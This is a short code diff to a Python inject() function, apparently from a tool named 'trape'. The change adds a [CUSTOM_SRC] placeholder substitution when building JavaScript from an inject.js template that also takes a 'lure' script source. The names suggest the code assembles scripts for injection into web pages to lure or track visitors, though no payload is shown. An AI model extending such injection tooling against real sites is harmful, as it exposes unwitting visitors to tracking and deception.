@@ -130,7 +130,7 @@ def inject():
         mPath = sys._MEIPASS + '/'
 
     f_codeToInject = open(mPath + "static/js/inject.js","r")
-    codeToInject = f_codeToInject.read().replace('[LIBS_SRC]', trape.JSFiles[1]['src']).replace('[BASE_SRC]', trape.JSFiles[0]['src']).replace('[LURE_SRC]', trape.JSFiles[3]['src'])
+    codeToInject = f_codeToInject.read().replace('[LIBS_SRC]', trape.JSFiles[1]['src']).replace('[BASE_SRC]', trape.JSFiles[0]['src']).replace('[LURE_SRC]', trape.JSFiles[3]['src']).replace('[CUSTOM_SRC]', trape.JSFiles[6]['src'])
     f_codeToInject.close()
 
     server_code = ''
